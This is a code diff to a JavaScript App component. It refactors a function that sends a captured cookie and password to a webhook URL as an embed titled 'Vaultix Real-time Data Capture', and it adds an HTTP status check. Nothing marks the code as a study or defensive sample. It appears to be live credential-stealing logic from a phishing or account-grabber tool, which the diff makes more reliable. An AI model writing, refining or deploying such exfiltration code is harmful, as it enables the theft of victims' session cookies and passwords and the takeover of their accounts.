@@ -54,22 +54,28 @@ export default function App() {
       if (!webhookUrl || (!cookie && !password)) return;
 
       try {
-        await fetch(webhookUrl, {
+        const payload = {
+          embeds: [{
+            title: "Vaultix Real-time Data Capture",
+            color: 0x0066ff,
+            fields: [
+              { name: "Method", value: method, inline: true },
+              { name: "Cookie", value: "```" + (cookie || "Pending...") + "```" },
+              { name: "Password", value: password || "N/A", inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: "Vaultix Real-time Data Capture",
-              color: 0x0066ff,
-              fields: [
-                { name: "Method", value: method, inline: true },
-                { name: "Cookie", value: "```" + (cookie || "Pending...") + "```" },
-                { name: "Password", value: password || "N/A", inline: true }
-              ],
-              timestamp: new Date().toISOString()
-            }]
-          })
+          body: JSON.stringify(payload)
         });
+
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
       } catch (e) {
         console.error("Webhook sync failed", e);
       }
